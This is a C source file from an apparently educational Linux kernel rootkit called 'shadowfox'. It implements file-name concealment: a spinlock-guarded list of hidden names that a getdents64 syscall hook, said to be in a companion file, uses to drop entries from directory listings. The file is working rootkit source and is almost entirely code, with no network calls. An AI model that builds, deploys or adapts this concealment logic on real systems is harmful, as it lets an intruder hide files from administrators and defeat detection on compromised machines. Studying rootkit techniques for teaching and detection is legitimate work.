// SPDX-License-Identifier: GPL-2.0
/*
 * shadowfox: filename concealment from getdents64 enumeration.
 *
 * The Stage 3 hook on __x64_sys_getdents64 (in hide_proc.c)
 * already walks every dirent and drops entries matching a hidden
 * PID. Stage 4 layers a second filter on the same walk: drop
 * entries whose name appears in this module's hidden-file set.
 *
 * Matching is exact and case-sensitive — the simplest pattern.
 * Diamorphine's prefix model (anything starting with a magic
 * string) is a Stage 6/8 extension if you want it; for an
 * educational technique demo, exact-match keeps the
 * implementation transparent and the false-positive surface zero.
 *
 * Refuses "." and ".." — hiding either would make every userspace
 * directory walk error out, which is no fun in a teaching demo.
 *
 * Storage: kmalloc'd linked list with a flexible-array string per
 * entry. Each entry costs sizeof(struct hidden_file) + strlen + 1
 * bytes — efficient for short filenames, accommodates up to
 * NAME_MAX (255) bytes.
 *
 * Locking: a single spinlock protects the list. Held briefly by
 * the syscall-hook's membership check and by the debugfs write
 * handler.
 */

#define pr_fmt(fmt) KBUILD_MODNAME ": " fmt

#include <linux/errno.h>
#include <linux/limits.h>
#include <linux/list.h>
#include <linux/printk.h>
#include <linux/slab.h>
#include <linux/spinlock.h>
#include <linux/string.h>

#include "hide_files.h"

struct hidden_file {
	struct list_head	link;
	char			name[];	/* kmalloc'd: sizeof + strlen + 1 */
};

static LIST_HEAD(hidden_files);
static DEFINE_SPINLOCK(hidden_files_lock);

bool sf_files_should_hide(const char *name, int namelen)
{
	struct hidden_file *h;
	bool found = false;

	if (namelen <= 0)
		return false;

	spin_lock(&hidden_files_lock);
	list_for_each_entry(h, &hidden_files, link) {
		size_t hnlen = strlen(h->name);

		if (hnlen == (size_t)namelen &&
		    memcmp(h->name, name, namelen) == 0) {
			found = true;
			break;
		}
	}
	spin_unlock(&hidden_files_lock);
	return found;
}

int sf_files_hide(const char *name)
{
	struct hidden_file *new_entry, *h;
	size_t name_len;

	if (!name || !*name)
		return -EINVAL;
	if (!strcmp(name, ".") || !strcmp(name, ".."))
		return -EPERM;  /* hiding . or .. breaks ls */

	name_len = strlen(name);
	if (name_len > NAME_MAX)
		return -ENAMETOOLONG;

	new_entry = kzalloc(sizeof(*new_entry) + name_len + 1, GFP_KERNEL);
	if (!new_entry)
		return -ENOMEM;
	memcpy(new_entry->name, name, name_len + 1);

	spin_lock(&hidden_files_lock);
	list_for_each_entry(h, &hidden_files, link) {
		if (!strcmp(h->name, name)) {
			spin_unlock(&hidden_files_lock);
			kfree(new_entry);
			return -EEXIST;
		}
	}
	list_add(&new_entry->link, &hidden_files);
	spin_unlock(&hidden_files_lock);

	pr_info("hiding file name '%s' from getdents64 enumeration\n", name);
	return 0;
}

int sf_files_show(const char *name)
{
	struct hidden_file *h, *tmp;
	bool found = false;

	if (!name || !*name)
		return -EINVAL;

	spin_lock(&hidden_files_lock);
	list_for_each_entry_safe(h, tmp, &hidden_files, link) {
		if (!strcmp(h->name, name)) {
			list_del(&h->link);
			kfree(h);
			found = true;
			break;
		}
	}
	spin_unlock(&hidden_files_lock);

	if (!found)
		return -ENOENT;

	pr_info("showing file name '%s' (no longer hidden)\n", name);
	return 0;
}

void sf_files_clear(void)
{
	struct hidden_file *h, *tmp;
	int count = 0;

	spin_lock(&hidden_files_lock);
	list_for_each_entry_safe(h, tmp, &hidden_files, link) {
		list_del(&h->link);
		kfree(h);
		count++;
	}
	spin_unlock(&hidden_files_lock);

	if (count > 0)
		pr_info("cleared %d hidden file entries\n", count);
}
